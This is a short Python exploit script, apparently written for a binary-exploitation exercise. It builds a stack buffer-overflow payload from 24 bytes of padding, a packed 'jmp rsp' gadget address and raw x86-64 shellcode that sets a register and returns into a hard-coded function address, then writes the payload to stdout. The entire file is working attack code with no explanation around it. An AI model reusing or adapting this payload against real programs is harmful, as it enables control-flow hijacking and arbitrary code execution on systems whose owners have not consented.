import sys
import struct

jmp_rsp = 0x401e0b

shellcode = b'\x31\xff' + b'\xff\xc7'*4 + b'\x68\x87\x1a\x40\x00' + b'\xc3'

payload  = b'A' * 24
payload += struct.pack('<Q', jmp_rsp)
payload += shellcode
payload += b'\n'

sys.stdout.buffer.write(payload)